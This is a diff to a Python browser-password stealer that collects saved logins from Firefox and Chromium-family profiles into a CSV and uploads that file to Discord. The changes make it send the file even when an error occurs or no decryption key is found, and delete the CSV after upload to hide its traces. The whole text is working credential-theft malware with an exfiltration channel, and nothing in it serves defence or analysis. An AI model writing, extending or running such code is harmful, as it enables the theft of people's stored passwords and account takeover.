@@ -9,6 +9,7 @@ import shutil
 import csv
 import socket
 import requests
+import time
 
 # GLOBAL CONSTANTS
 BROWSERS = {
@@ -95,6 +96,7 @@ def extract_passwords(browser_name, browser_info):
 
             secret_key = get_secret_key(browser_name)
             if not secret_key and browser_name != "Firefox":
+                send_to_discord(csv_path)  # Send empty or error file to Discord
                 return
 
             if browser_name == "Firefox":
@@ -102,13 +104,14 @@ def extract_passwords(browser_name, browser_info):
                 for profile in profiles:
                     if ".default" in profile:
                         db_path = os.path.join(browser_info["path"], profile, "logins.json")
-                        with open(db_path, "r", encoding="utf-8") as f:
-                            logins = json.load(f)["logins"]
-                        for index, login in enumerate(logins):
-                            url = login["hostname"]
-                            username = login["encryptedUsername"]
-                            password = login["encryptedPassword"]
-                            csv_writer.writerow([index, url, username, password])
+                        if os.path.exists(db_path):
+                            with open(db_path, "r", encoding="utf-8") as f:
+                                logins = json.load(f)["logins"]
+                            for index, login in enumerate(logins):
+                                url = login["hostname"]
+                                username = login["encryptedUsername"]
+                                password = login["encryptedPassword"]
+                                csv_writer.writerow([index, url, username, password])
             else:
                 folders = [element for element in os.listdir(browser_info["path"]) if re.search("^Profile*|^Default$", element) is not None]
                 for folder in folders:
@@ -126,8 +129,11 @@ def extract_passwords(browser_name, browser_info):
                         conn.close()
                         os.remove("Loginvault.db")
         send_to_discord(csv_path)
+        time.sleep(1)  # Wait for 1 second before deleting the file
+        os.remove(csv_path)
     except Exception as e:
         print(f"[ERR] {browser_name}: {e}")
+        send_to_discord(csv_path)  # Send error file to Discord even if an exception occurs
 
 def send_to_discord(file_path):
     try:
